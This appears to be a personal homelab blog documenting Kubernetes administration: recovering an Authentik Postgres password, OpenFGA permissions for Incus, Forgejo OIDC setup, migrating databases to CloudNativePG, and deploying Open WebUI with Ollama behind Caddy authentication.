<p><code>root@thoth:/var/lib/rancher/rke2/bin# ./runc --root /run/containerd/runc/k8s.io/ exec -t -u 0 f2aedf564b6f43fc895fc84aeba2e7e7a02b4f59ea835de13b76bcade462adca bash</code></p>
<p>I’m root indeed, but I still am struggling to connect to the postgres server, and it is asking for a password. Actually, I can give it one — but my password contains special characters, making it difficult to enter manually. I can change the password, and then.</p>
<p>I encode special characters in the url, but it doesn’t work:</p>
<p><code>I have no name!@authentik-postgresql-0:/bitnami/postgresql$ psql 'postgresql://postgres:secretpassword/@localhost/' psql: error: local user with ID 1001 does not exist</code></p>
<p>I could nuke authentik and reset it, but instaed, I think I am going to change the secret authentik uses for the password, while downgrading postgres at the same time.</p>
<p>So firstly I need to edit the sops file:</p>
<p><code>export SOPS_AGE_KEY_FILE=~/vscode/flux-config/age.agekey</code></p>
<p><code>sops edit --ignore-mac secrets.yaml</code> –ignore-mac is needed because sops thinks the file has been tampered with.</p>
<p>But even after editing the file, it still asks for a password, and it doesn’t work.</p>

</div>
<p>The container doesn’t come with an editor. :/</p>
<p>Trying something else, there is a docker container, <a href="https://github.com/pgautoupgrade/docker-pgautoupgrade">pgautoupgrade</a> to automatically upgrade a database.</p>
<p>Firstly, I located the persistent volume in “/var/openebs” on the system. Then I ran the command:</p>
<p><code>root@thoth:/var/openebs/persistent/pvc-513c6021-afbb-410c-9c86-60fcf9d6089c# podman run -it -v "./data:/var/lib/postgresql/data" -e POSTGRES_PASSWORD=secretpassword -e PGAUTO_ONESHOT=yes docker.io/pgautoupgrade/pgautoupgrade:17-bookworm</code></p>
<p>The update works!</p>
<p>But authentik still fails to access postgres via the password. The logs for both simply say that password authentiation failed.</p>
<p>I also try some debug pods:</p>
<pre><code>kubectl debug -n authentik authentik-server-5dcc9c45f5-thllc -it --image=busybox --target=server
kubectl debug -n authentik authentik-postgresql-0 -it --image=busybox --target=postgresql</code></pre>
<p>Interesting and useful feature, but not helpful at the moment. <code>:(</code></p>
<p>The Bitnami postgresql chart, used here, seems to have something to <a href="https://github.com/bitnami/charts/tree/main/bitnami/postgresql#automated-update-using-a-password-update-job">automatically update to the new passwords</a>, but it requires the old passwords.</p>
<p><code>mv pg_hba.conf pg_hba.conf.bac</code></p>
<p><code>echo "local    all             all                                     trust" &gt; pga.conf</code> (No text editor, and these config files don’t seem to be mounted.)</p>
<p><code>/opt/bitnami/postgresql/bin/pg_ctl reload</code></p>
<p>Then I can get in. Now I have to change the password manually.</p>
<p><code>psql -U postgres</code></p>
<p>And then:</p>
<pre><code>postgres=# ALTER USER authentik WITH PASSWORD 'secretpassword';
ALTER ROLE
postgres=# ALTER USER postgres WITH PASSWORD 'secretpassword';
ALTER ROLE
postgres=#</code></pre>
<p>Then I put the original <code>pg_hba.conf</code> back, and run <code>pg_ctl reload</code>.</p>
<p>And it works!</p>

<p>Just some nice to have things that don’t seem to be there by default:</p>
<ul>
<li><del>Invitations</del></li>
<li><del>Passwords on the same sign in page</del></li>
<li>Recovery (password change flow)</li>
</ul>
<p>I managed to get the latter pretty simply, by selecting a “password stage” in the options for the <code>default-authentication-flow</code>. After that, users no longer need to click twice, they can sign in from a single page.</p>
<p>Next up is password recovery. When I try to click on “Create recovery link” so I can create recovery links for users, I get an error “Recovery flow not applicable to user”.</p>

<h2 class="anchored" data-anchor-id="openfga">Openfga</h2>
<p>Okay, I deployed it using the helm chart. I’m lookiing through the <a href="https://linuxcontainers.org/incus/docs/main/authorization/#open-fine-grained-authorization-openfga">Incus docs</a>. So it looks like Incus does the intial setup.</p>
<p>Then, once I do that, I need to <a href="https://openfga.dev/docs/getting-started/update-tuples">call the API to update relations</a>.</p>
<p>Also, I need to add a nodeport service so that Incus can access the server. After scrolling through <a href="https://tag-security.cncf.io/community/assessments/projects/openfga/joint-assessment/">a very interesting security audit</a>:</p>
<blockquote class="blockquote">
<p>The likelihood is rated low as OpenFGA is designed to be run within an intranet environment and not exposed to public internet.</p>
</blockquote>
<p>And this is somewhat difficult with my setup. I deployed it on Kubernetes, with no firewall, and now I want to expose the service — but only to localhost.</p>
<p>Actually that also doesn’t work. It looks like coder instances are placed on the same ip address as my host machine, meaning they would have access to all network stuff that localhost would.</p>
<p>No, looking further, it does look like openfga does use authentication, and the reason why an intranet is recommended is in case of ddos attacks.</p>
<p>Here is my secret:</p>

<p><code>nix-shell -p openfga-cli</code>, or other methods of installing the openfga cli.</p>

<p>This is also vague, but something interesting shows up in the journald logs:</p>
<pre><code>Jun 02 23:15:34 thoth incusd[1286]: time="2025-06-02T23:15:34-07:00" level=warning msg="Rejecting request from untrusted client" ip="130.166.192.112:12998"</code></pre>
<p>I found the <a href="https://github.com/lxc/incus/blob/5efa7d369e6cf74f452ff5b298bc4687d2da66ae/cmd/incusd/daemon.go#L703">error in the source code</a>, but I don’t quite understand what’s going on.</p>
<p>After finding some <a href="https://discuss.linuxcontainers.org/t/need-help-incus-oidc-with-zitadel/19812/4">discussion posts</a>, I changed the oidc claim from <code>preferred_username</code> to <code>email</code>, and it works ­— kinda. It only works if I login and launch the web ui via the incus command line client (website still gets that error), and when I do so, I don’t have access to anything at all.</p>
<p>Also, incus seems to have an error in the logs, related to openfga:</p>
<pre><code>Jun 09 17:33:15 thoth incusd[426476]: time="2025-06-09T17:33:15-07:00" level=error msg="Failed background OpenFGA resource sync" err="Failed to write tuple to OpenFGA store (user: \"server:incus\"; relation: \"server\"; object: \"certificate:025a3516ca2c622a93446548954e33d75eafa3e8173d0d6a435fc27d4072932e\"): Write validation error for POST Write with body {\"code\":\"validation_error\",\"message\":\"invalid TupleKey.Object: value does not match regex pattern \\\"^[^\\\\\\\\s]{2,256}$\\\"\"}\n with error code validation_error error message: invalid TupleKey.Object: value does not match regex pattern \"^[^\\\\s]{2,256}$\""</code></pre>
<p><code>fga tuple write --store-id=$FGA_STORE_ID group:layer8#member user server:incus</code></p>
<p>Still no dice. What about the admin role?</p>
<p><code>fga tuple write --store-id=$FGA_STORE_ID group:layer8#member admin server:incus</code></p>
<p>I also tried:</p>
<p><code>fga tuple write --store-id=$FGA_STORE_ID user:testuser admin server:incus</code>, and variants including <code>test@gmail.com</code> (email address of my testuers).</p>
<p>Still doesn’t work, but I did learn something. It seems that openfga is not reading groups from ldap/oidc to figure out what groups users are in, but instead it has it’s own groups, that I have to add users to, as a relation.</p>
<p>Also, I switched the oidc claim back to <code>preferred_username</code>, instead of <code>email</code>, and it does show up as a different <code>user:username</code> in the openfga logs, instead of <code>user:email</code>.</p>
<p>Wait, that’s not true: If the user has server:admin permissions, then they can change server settings, even though they can’t see any instances or projects.</p>
<p>And if I give the user the operator relation to the layer8 project, then it can see only two of the 9 existing vitual machines <code>:(</code></p>
<p>I have two theories:</p>
<ol type="1">
<li><p>This is something to do with accessing certain networks, specifically the <code>public0</code> network I have, and the <code>default</code> disk pool. These aren’t considered under the “layer8” project, so they aren’t able to be accessed by the machine. It could also be the images, that are considered under project “default” and not</p></li>
<li><p>The Openfga relations are broken and need to be rebuilt.</p></li>
</ol>
<p>Something else: Why am I trying to figure it out? It seems like sso users can access, view, create, and delete stuff, just not everything that is already there.</p>
<pre><code>[nix-shell:~/vscode/moonpiedumplings.github.io]$ fga tuple write --store-id=$FGA_STORE_ID project:layer8 project profile:layer8/default</code></pre>
<p>This enables my test user to see the layer8 default profile, but I really think this is the kind of relationship that should have been automatically added. And upon further searching, it seems that the two instances I care about, already are explicitly under the layer8 certificate.</p>
<div class="sourceCode" id="cb48" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb48-1">~/vscode/moonpiedumplings.github.io&gt; fga tuple write --store-id=01JWHMZPF85VE8DWYHKV90QTCT project:layer8 project instance:layer8/*</span>
<span id="cb48-2"></span>
<span id="cb48-3">~/vscode/moonpiedumplings.github.io&gt; fga tuple write --store-id=01JWHMZPF85VE8DWYHKV90QTCT project:layer8 project instance:layer8/Kal-Test</span></code></pre></div>
<p>Sadly, the former doesn’t work, but the latter does. Also, it seems that when I move instances from one project to another, the openfga relations are created, allowing me to access stuff.</p>
<p><code>incus move --target-project default --project layer8 Kal-Test</code> (the Instance must be stopped).</p>
<p>After creating a new storage pool, I see the relation that is missing:</p>
<div class="sourceCode" id="cb49" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb49-1">      "key": {</span>
<span id="cb49-2">        "object":"storage_pool:testpool",</span>
<span id="cb49-3">        "relation":"server",</span>
<span id="cb49-4">        "user":"server:incus"</span>
<span id="cb49-5">      },</span>
<span id="cb49-6">      "timestamp":"2025-06-16T23:29:34.933052608Z"</span></code></pre></div>
<p>Adding this relation to the other storage pools, and then it works.</p>
<p>Next up is networks, which do not load.</p>
<p>I tried:</p>
<pre><code>[nix-shell:~]$ fga tuple write --store-id=01K001MQRKQ1BH74FZP9H1V89X server:incus server project:layer8</code></pre>
<p>This doesn’t work, but is probably needed anyways so I am keeping it here.</p>
<pre><code>[nix-shell:~]$ fga tuple write --store-id=01K001MQRKQ1BH74FZP9H1V89X project:layer8 project network:default/internal0</code></pre>
<p>Now it works, and people with access to the layer8 network can access this subnet. Although this kind of control seems to be redundant with the way that projects have a built in way to restrict what networks they use.</p>
<p>Finally, I also need to control storage pools.</p>

<p>But this one was automatically added. Maybe Incus automatically syncs resources, and I don’t need to do it manually, I just need to wait?</p>
<p>Oh, and another issue I had is that after I rebooted my machine, all my openfga relations where lost. I forgot to deploy the openfga connected to the postgres, so no actual data was being stored persistently.</p>
<p>I also made the same mistake with coder earlier. In the future, I will delete my helmreleases and then redeploy them to ensure that the data is actually persistent.</p>
<p>I nuked the setup and attempted to reset it up again, but I <a href="https://github.com/openfga/helm-charts/issues/211">ran into an issue</a>. I tried some of the fixes in that thread, but they did not work (probably because ArgoCD is different from Flux).</p>
<p>What worked was <a href="https://github.com/fluxcd/flux2/discussions/1085#discussioncomment-473271">a thread about flux</a>, where essentially the problem is that flux waits for pods to be created before running post install jobs. But, sometimes pods can have a pod that doesn’t do anything but wait for the jobs to complete, so the waiting for the pods to be fully created must be disabled.</p>

<p>I am debating between Nextcloud, and other options.</p>
<p>Nextcloud:</p>
<ul>
<li>Popular</li>
<li>But it’s in PHP, with an older architecture</li>
<li>Extremely extendable, with many extensions/apps in their “store”</li>
</ul>
<p>Opencloud</p>
</section>
<section id="forgejo" class="level2">
<h2 class="anchored" data-anchor-id="forgejo">Forgejo</h2>
<p>Firstly, here are relevant links:</p>
<p><a href="https://artifacthub.io/packages/helm/forgejo-helm/forgejo" class="uri">https://artifacthub.io/packages/helm/forgejo-helm/forgejo</a></p>
<p><a href="https://code.forgejo.org/forgejo-helm/forgejo-helm/src/branch/main/values.yaml" class="uri">https://code.forgejo.org/forgejo-helm/forgejo-helm/src/branch/main/values.yaml</a> — These are the actual values</p>
<p><a href="https://forgejo.org/docs/latest/admin/config-cheat-sheet/" class="uri">https://forgejo.org/docs/latest/admin/config-cheat-sheet/</a> — and this is the forgeo cheat sheet, and all values in here can be set in the helm chart.</p>
<p>So what needs to be done is mainly the oauth/oidc login.</p>
<ul>
<li>Disable built in accounts (sign up, and log in)</li>
<li>Oauth login</li>
</ul>
<p>Another thing I want to do is deploy <a href="https://anubis.techaro.lol/docs/admin/environments/kubernetes">anubis</a> to protect from scrapers. Due to the way that git forges seem to dynamically generate content, when scrapers attempt to scrape forges, there is a massive CPU load. A temporary workaround is I’m going to block viewing except for signed in users, but this will be a longer term solution.</p>
<p>To start, firstly it seemms like forgejo uses a syntax of <a href="https://artifacthub.io/packages/helm/forgejo-helm/forgejo#oauth2-settings">existingsecret</a> to be able to easily add secret data to the helm configuration.</p>
<p>Another thing I want to deploy is <a href="https://forgejo.org/2023-02-27-forgejo-actions/">forgejo’s built in actions</a>. However, <a href="https://forgejo.org/docs/latest/admin/runner-installation/">according to the docs</a>, it seems like actions are not ran in a virtual machine, like Github actions are. Instead they are ran in docker/podman/lxc containers, which is much, much weaker isolation from the host overall.</p>
<p>After some thought, I think the best way to do this is to not deploy a runner initially, but instead to deploy a virtual machine on Incus and connect it layer on. The most theoretically way to do this, I think, is to set up the docker-in-docker image to use the kata-containers runtime instead of normal docker, so the docker jobs are actually being ran in VM’s. I’m not really interested in a complex setup though, so I’ll just get it up first.</p>
<p>Right now I’ll just get forgejo up, but Incus provides Nixos images, and the <a href="https://forgejo.org/docs/latest/admin/runner-installation/#nixos">forgejo runner has a nixos config</a>.</p>
<p>Things were mostly going smoothly, until I was playing with oauth. I think that forgejo supports three different things that get conflated when I try to search for them:</p>
<ul>
<li>Acting as an Oauth2 <em>client</em></li>
<li>Logins via OpenID</li>
<li>Acting as an Oauth2 <em>provider</em></li>
</ul>
<p>I am going through the <a href="https://codeberg.org/forgejo/docs">forgejo docs</a> right now (the website doesn’t support search so I cloneed the git repo), and it appears that being an Oauth2 client is not really documented. OpenID is barely documented beyond a brief mention, it’s only the Oauth2 provider that is extensively mentioned.</p>
<p>But I know that forgejo supports more Ouath configuration options beyond <a href="https://code.forgejo.org/forgejo-helm/forgejo-helm/src/branch/main/values.yaml#L468">what the helm chart mentions</a> <a href="https://github.com/blackxored/homelab-legacy/blob/2fa182fb3d38022b19ca25bd35c8c44790689f95/kubernetes/apps/default/forgejo/app/helmrelease.yaml#L139">like in this example</a></p>
<p>I suspect this is because setting up an Oauth2 provider via the UI is trivial and self explanatory. But I am not using the UI, so I found the <a href="https://codeberg.org/forgejo/forgejo/src/branch/forgejo/cmd/admin_auth_oauth.go#L18">relevant source code</a>, and it explains the options.</p>
<p>The issue is the way I do secrets. I was copying the <code>existingSecret</code> syntax from the bitnami subcharts, but that does not work. <a href="https://code.forgejo.org/forgejo-helm/forgejo-helm#additional-_app-ini_-settings">Forgejo has two ways to do secrets</a>. I dislike both of them, because I am trying to amke as much of my infra public as possible, except for the keys themselves. But with redis, I am forced to have the <code>host</code> option, which includes a password, be encyrpted in it’s entireity.</p>
<p>Well, I could use variables, but those also add complexity. After some pondering, I think the best way to do it is to just have commented out versions that do not include the sensitive data.</p>
<p>So I map out all the options, fix some minor issues, and I think the forgejo pod fials to deploy because I have “hostport” set, which doesn’t work if forgejo is doing a rootless deployment.</p>
<p>To fix:</p>

<p>This doesn’t work, because apparently it only affects the pod’s network namespace, and not the host.</p>
<p>Another way to do this is by using a nodeport or loadbalancer service, but the reason why I am not a fan of those is that due to klipper-lb, all connections to ssh that way would appear to have the ip address of my server machine, rather than the ip address of the user.</p>
<p>I guess the best way to do this is to expose extra ports using ingress-nginx, and then use ingress-nginx to expose a tcp service. One problem is that the <a href="https://kubernetes.github.io/ingress-nginx/user-guide/exposing-tcp-udp-services/">method to expose tcp services</a> is specific to ingress-nginx, and not general.</p>

<p>Are these settings important enough for me to set manually? According to the docs they are</p>
<p>Also, I think that the configuration settings are not changed to the default if you unset them in the helm settings, they stay what they are. So I must explicitly change them.</p>

<p>This error happened becasue the oauth “group mappings” where wrong. I quote them and it works.</p>
<p>But the group mappings are not actually replied. When I configure authentik to restrict logins to anybody who has a groups claim in their scope, my test user cannot log in at all. Either Forgejo is not collecting the groups claim, or authentik is not giving it.</p>
<p>From the authentik logs:</p>
<pre><code>{"auth_via": "session", "domain_url": "sso.moonpiedumpl.ing", "event": "Application requested scopes not configured, setting to overlap", "host": "sso.moonpiedumpl.ing", "level": "info", "logger": "authentik.providers.oauth2.views.authorize", "pid": 70086, "request_id": "aabf16600fcb46e587f201bdec77a769", "schema_name": "public", "scope_allowed": "{'email', 'profile', 'openid'}", "scope_given": "{'email', 'groups', 'openid'}", "timestamp": "2025-07-26T11:23:10.187861"}</code></pre>
<p>Also, attempting to ask for the <code>preferred_username</code> claim, it also fails. But the <code>email</code> claim works. So essentially, nothing from the <code>profile</code> scope works, even when I explicitly ask for it.</p>
<p><code>OPENID_CONNECT_SCOPES: "openid email groups"</code></p>
<p>I think this was the problem, it doesn’t have the <code>profile</code> scope. After removing this config, the group mapping works (but I must create the organization and group in advance).</p>

<p>It seems to try to get the openid scope twice though, so I removed it from the config again.</p>
<p>Okay, I tried to start forgejo today and I got an error about not being able to find the database. What happened, is that the <a href="https://programming.dev/post/34498219">Bitnami Helm Charts</a> that deploy the databases, are no longer publicly available for use. <a href="https://artifacthub.io/packages/helm/forgejo-helm/forgejo#external-database">Forgejo’s Helm Chart now recommends operators for databases</a>.</p>

<p><a href="https://artifacthub.io/packages/helm/cloudnative-pg/cloudnative-pg" class="uri">https://artifacthub.io/packages/helm/cloudnative-pg/cloudnative-pg</a></p>
<p>I started out by just copying the repo and helm release templates that I have previously used. It works easily, without me passing in any values. It seems that postgres does not require any configuration.</p>
<p>Firstly, deployed a test database using an example from their <a href="https://cloudnative-pg.io/documentation/1.25/quickstart/#part-3-deploy-a-postgresql-cluster">quick start</a>. However, I deployed only one instance, instead of 3, because I only have one physical server.</p>
<p>Although cool, that’s not enough. I also need to ensure it has the correct username/password, and that it restores the information that was previously in older postgres database that forgejo was using.</p>
<p><code>forgejo     data-forgejo-postgresql-0                         Bound    pvc-9a77499a-71d8-4a7b-bda4-fd8d66c1c86c   10Gi       RWO            openebs-persistent-hostpath   &lt;unset&gt;                 25d</code></p>
<p>Thankfully, using openebs local paths, makes it easy to actually go in and fine the database files.</p>
<div class="sourceCode" id="cb58" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb58-1">root@thoth:/var/openebs/persistent/pvc-9a77499a-71d8-4a7b-bda4-fd8d66c1c86c/data# ls</span>

<p>Now, I need to figure out how to import from this. I think what I’m going to have to do, is run a <a href="https://hub.docker.com/_/postgres">postgres docker container</a>, and then dump the database, so I can import into a new database.</p>
<p>Firstly, I will backup the files to ensure that anythign I do doesn’t nuke all my data.</p>
<p><code>root@thoth:/var/openebs/persistent/pvc-9a77499a-71d8-4a7b-bda4-fd8d66c1c86c# tar -czf data.tar.gz data/</code></p>
<p>I also ran a test to extract the archive, to make sure that worked. Now that I’ve done this.</p>
<p>In addition to that, I will need to create a cluster and a database to import the data into.</p>
<p>But when I attempt to start a database using the postgres docker container, it complains that certain config files (like postgres.conf, pg_hba.conf) are not found. Bitnami’s helm version of postgres seems to automatically create these files somewhere else than the data directory.</p>
<p>Although possible to create those, I think an easier way might be to deploy the older version of forgejo, and then export the data from there using the pgsql cli. It errored due to ownership at first, so I had to run chown.</p>
<p><code>root@thoth:/var/openebs/persistent/pvc-9a77499a-71d8-4a7b-bda4-fd8d66c1c86c# chown -R 1001:1001 data</code></p>
<p>And with this, forgejo (and the database I care about) is finally up. I can shell into it, and run pg_dump.</p>
<div class="sourceCode" id="cb59" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb59-1">I have no name!@forgejo-postgresql-0:/bitnami/postgresql/backupdir$ pg_dump -U forgejo -f dump.sql</span>

<span id="cb59-3">I have no name!@forgejo-postgresql-0:/bitnami/postgresql/backupdir$ ls</span>
<span id="cb59-4">dump.sql</span></code></pre></div>
<p>Next up is to deploy the new database. One of the interesting things about cloudnativepg is that it doesn’t just deploy a database, it deploys a cluster, and then deploys databases to that cluster. But, is it better to deploy one cluster with multiple databases, or multiple clusters?</p>
<p>Architecture of postgres cluster/database:</p>
<ul>
<li><a href="https://cloudnative-pg.io/documentation/1.17/architecture/" class="uri">https://cloudnative-pg.io/documentation/1.17/architecture/</a></li>
<li><a href="https://www.cncf.io/blog/2023/09/29/recommended-architectures-for-postgresql-in-kubernetes/" class="uri">https://www.cncf.io/blog/2023/09/29/recommended-architectures-for-postgresql-in-kubernetes/</a></li>
</ul>
<p>One thing I found via some preliminary research is that CloudNativePG’s backup solutions seem to be cluster based, rather than database based. <a href="https://cloudnative-pg.io/documentation/1.27/backup/#backup">They have some harsh words about database dumps, anyways</a>:</p>
<blockquote class="blockquote">
<p>This section covers physical backups in PostgreSQL. While PostgreSQL also supports logical backups using the pg_dump utility, these are not suitable for business continuity and are not managed by CloudNativePG. If you still wish to use pg_dump, refer to the Troubleshooting / Emergency backup section for guidance.</p>
</blockquote>
<p>I think the best option is to have a cluster for each app. This way I could back up each app’s database/cluster, using CloudNativePG’s tools. This backup might not just be for recovery purposes, but also I might want an older version of the database at some point.</p>
<p>Another thing is that it seems that the Cluster resource can automatically initialize a database, using configuration <a href="https://cloudnative-pg.io/documentation/1.27/cloudnative-pg.v1/#postgresql-cnpg-io-v1-BootstrapInitDB">found here</a>. <a href="https://cloudnative-pg.io/documentation/1.27/bootstrap/#bootstrap-an-empty-cluster-initdb">The way that secrets work is documented here</a>.</p>
<p>Also, when cloudnativepg deploys a cluster, it automatically creates <a href="https://cloudnative-pg.io/documentation/1.27/service_management/">kubernetes services for the database</a>.</p>
<pre><code>NAME                  TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE
anubis-forgejo        ClusterIP   10.43.225.133   &lt;none&gt;        80/TCP     42d
forgejo-postgres-r    ClusterIP   10.43.188.149   &lt;none&gt;        5432/TCP   5s

forgejo-postgres-rw   ClusterIP   10.43.254.130   &lt;none&gt;        5432/TCP   4s</code></pre>
<p>This is pretty neat, you can have readwrite and readonly versions of services. I think I will disable everything but the readwrite serivce, however.</p>
<p>Although cool, I found that even though cloudnativepg creates a persistentvolumeclaim, it deletes it when it is done. This is bad because it means that if I delete the postgres cluster I lose the data. It looks like what you are expected to do, is to backup the</p>
<p>Another thing to not about storage, is that <a href="https://www.postgresql.org/docs/current/wal-intro.html">postgre does not need journaling</a>. I should probably create a custom PersistentVolumeClass that has writeback/journaling disabled for that folder only. But that seems to not be possible, so instead I will use openebs <a href="https://openebs.io/docs/user-guides/local-storage-user-guide/local-pv-lvm/advanced-operations/lvm-raw-block-volume">block volumes</a>, which are designed for this use case.</p>
<p>Also, it turns out that the <code>local.csi.openebs.io</code> is the newer provisioner, and supports more features than the older <code>openebs.io/local</code> that I was using. It also looks like migration is not trivial, so I will probably only use the newer interface for just this.</p>
<p>It does look like I need to have an actual LVM partition/disk available on my host. In addition to that, I also think I may need to update openebs to get access to the newer openebs.io/local chart.</p>
<p>Okay, this really sucks, but <a href="https://github.com/bitnami/charts">Bitnami helm charts break tomorrow</a> (today is 8/27/2025). I need something to keep these services up, and that means forgoing an OpenEBS update, and using a journaled filesystem for my databases. I do at least want backups, so I will investigate how to do those. When combined with simultaneously trying to figure out why my network is wonky, I just don’t have enough time. I suppose stuff like this is why real engineers work as teams.</p>
<p>The problem is backups. <a href="https://cloudnative-pg.io/documentation/1.27/backup/">CNPG</a> supports two methods, one of which is an object store, and another is via volume snapshots. I wanted to avoid setting up an external object store, especially from the paid platforms.</p>
<p>I wanted to use snapshots, but openebs hostpath does not support volume snapshots. And I don’t have enough time to build and test backups. I think I will use <code>pg_dump</code>, despite them “not being suitable for business continuity”.</p>
<p>It looks like <a href="https://github.com/cloudnative-pg/cloudnative-pg/discussions/5253">there is no easy way to have the PVC’s not delete themselves</a> either. It seems that what you are expected to do is really to bootstrap a new cluster from the backups, like <a href="https://cloudnative-pg.io/documentation/1.27/recovery/#recover">documented here</a>.</p>
<p>Okay, I think I could use <a href="https://github.com/openebs/rawfile-localpv">openebs-rawfile</a> for some of those features like snapshots.</p>

<span id="cb61-8">05:52 &lt; moonpie&gt; because if you are hosting a dtabase on k8s, it makes sense to not uses a clustered filesystem, because db's do it better</span>

<span id="cb61-10">05:52 &lt; moonpie&gt; but all of the raw block csi options I have found require lvm, zfs, or other partitions/disks to be provisioned</span>
<span id="cb61-11">05:53 &lt; moonpie&gt; Like.. why can't I just have one disk and you create loopback devices?</span>

<p>I think the correct choice here, is to deploy longhorn, <a href="https://cloudnative-pg.io/documentation/current/storage/">with a single replica</a>. And then use that for block storage. That’s also probably what people are doing in the real world. Such a setup reuses the clustered storage you are already using, but in a slighly different configuration that enables you do maximize the performance of your databases.</p>
<p>I also ran an intemediary check, to make sure that openebs hostpath does not support block volumes, and it does not. I attempt to create a longhorn block device for cloudnativepg, and that fails, because I guess it expects a filesystem.</p>
<p>This doesn’t really make sense to me. But I did get cloudnativepg deployed. I can even request a backup via a volumeshapshot:</p>
<p><code>kubectl cnpg backup -m volumeSnapshot -n forgejo forgejo-postgres</code></p>
<p><a href="https://github.com/cloudnative-pg/cloudnative-pg/issues/5203">They don’t seem to have a command to restore from a backup though</a>. It seems like you are expected to bootstrap a cluster from a backup instead.</p>
<p>To load the database, first I cp the dump in from my laptop:</p>
<pre><code>[moonpie@cachyos-x8664 dormlab]$ kubectl cp dump.sql -n forgejo forgejo-postgres-1:/var/lib/postgresql/data/dump.sql
Defaulted container "postgres" out of: postgres, bootstrap-controller (init)</code></pre>
<p>Then, inside the container I load the dump:</p>
<div class="sourceCode" id="cb63" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb63-1">postgres@forgejo-postgres-1:~/data$ psql -U postgres -d forgejo -f dump.sql</span></code></pre></div>
<p>And then I spin up forgejo again, pointing to the new database, and it’s finally up.</p>

<li>This one is cool because it seems to let you select between multiple backends, like llama, exllama, and more</li>
<li>It also explicitly supports cpu only, intel, amd, and vulkan. Although not relevant to my usecase, this is very interesting.</li>

<p>After some consideration, I decided to deploy Open Web UI. It appears to be the most comprehensive, and has an <a href="https://artifacthub.io/packages/helm/open-webui/open-webui">official helm chart</a>.</p>
<p>Here are the helm chart values: <a href="https://github.com/open-webui/helm-charts/blob/main/charts/open-webui/values.yaml" class="uri">https://github.com/open-webui/helm-charts/blob/main/charts/open-webui/values.yaml</a></p>
<p>It appears that a subchart of the ollama application is included in openwebui chart, as well. I deploy a fairly simple config, and then I get an error when attempting to use OIDC to sign in:</p>
<p><code>"You do not have permission to access this resource. Please contact your administrator for assistance."</code></p>
<p>This was fixed by ensuring that the users in groups I wanted to be able to connect were set in “allowedRoles”.</p>
<p>Another concern I have is that <a href="https://github.com/ollama/ollama/issues/849">ollama does not have any form of authentication</a> Although less of a concern in the real world, wehre the inside fo teh kubernetes cluster is considered trusted, in my lab, I give people access to the internal subnet. I could restrict traffic flows to this service via Network Policies, but I would rather add some form of authentication to the service. <a href="https://github.com/ollama/ollama/issues/903">Here is an example using caddy</a>.</p>
<p>I decided to use Caddy. I stopped using the ollama subchart, because I wanted to manually feed an ollama url to openwebui instead of letting openwebui guess.</p>
<div class="sourceCode" id="cb64" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb64-1">[moonpie@cachyos-x8664 flux-config]$ nix-shell -p caddy genpass</span>
<span id="cb64-2">[nix-shell:~/vscode/flux-config]$ genpass -dlu</span>
<span id="cb64-3">generatedpassword</span>
<span id="cb64-4">[nix-shell:~/vscode/flux-config]$ caddy hash-password</span>
<span id="cb64-5">Enter password:</span>
<span id="cb64-6">Confirm password:</span>
<span id="cb64-7">$2a$14$LdqC7FEIx2w6arGCNw7Pi.qxe2kFSvBecz.IvtdcdLvJe4V.xeyhi</span></code></pre></div>
<p>This gets me a password and a hash to use. I feed that to the config, and my default ollama url looks something like this: <code>http://ollama:secretpassword@ollama.owui.svc.cluster.local:11434</code>.</p>
<p>One concern I have is that PVC’s seem to get deleted when I delete the helm chart. This is despite the fact that I have a policy of <code>Retain</code> for the spcific persistentvolume class.</p>
<p>Uh oh. Upon further inspection, it seems that every PVC, even if they are deleted, the data stays there on the disk. This is somewhat concerning, as it means that nothing but manually deleting the volumes can be done. This isn’t really that big of an issue though.</p>
<p>Although, it seems that it’s not that PVC’s are being deleted, but instead that the persistenvolumes are not being rebound when the new iteration of openwebui/ollama are deployed. It looks like both create a persistentvolumeclaim by default, and you have to explicitly set if you would like to reuse an existing one. But first, I need to nuke all persistentvolumes.</p>
<p><code>[moonpie@cachyos-x8664 flux-config]$ kubectl get persistentvolume -n owui | grep owui | awk '{print $1}' &gt; deadpvcs.txt</code></p>
<p>This feeds the name of all the dead pvc’s into a text file. Then, I will iterate over this to delete.</p>
<p><code>[moonpie@cachyos-x8664 flux-config]$ xargs -L 1 -I {} kubectl delete persistentvolumes "{}" &lt; deadpvcs.txt</code></p>
<p>And then I have to delete the actual pvc from <code>/var/openebs/persistent</code>. On the remote server:</p>
<p><code>root@thoth:/var/openebs/persistent# xargs -L 1 -I {} rm -rf "{}" &lt; deadpvcs.txt</code></p>
<div class="sourceCode" id="cb65" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb65-1">[moonpie@cachyos-x8664 flux-config]$ kubectl get statefulsets.apps -A</span>

<span id="cb65-6">openfga     openfga-postgresql       1/1     51d</span></code></pre></div>
<p>Okay. I think the issue is that only kubernetes statefulsets keep a pvc if you delete the pods. It looks like deployments, and replicasets don’t. I think the best option is to declare a seperate PVC and then point the helm charts of ollama and openwebui to them. I tried experiement with the pvc name itself, the <code>pvc-0d7939f6-feaa-47cb-9b7f-9d0d359ab9c0</code> format, or the shortname, <code>owui/open-webui</code>, but neither work.</p>
<p>I rebooted and am trying to test if this is a one off issue by me installing longhorn.</p>

<p>Next thing is to test that it is not unique to openwebui/ollama. It seems that this is related to openwebui being a deployment, but not having an easy way to pin the persistent volume for deployments is annoying.</p>
<p>I tried with a persistentvolume at first, but apparently it wants a full persistentvolumeclaim instead.</p>
<section id="models" class="level3">
<h3 class="anchored" data-anchor-id="models">Models</h3>
<p>I do need to select a small set of good models. I am designing for a multi user system, meaning if too many people have too different models, I will run out of ram.</p>
<p>One thing that is cool, is that I am not limited to using models from <a href="https://ollama.com/search">ollama’s repo</a>, as ollama can <a href="https://huggingface.co/mradermacher/DeepHat-V1-7B-GGUF/tree/main?show_file_info=DeepHat-V1-7B.Q8_0.gguf&amp;local-app=ollama">download models from huggingface</a> and OCI repos.</p>
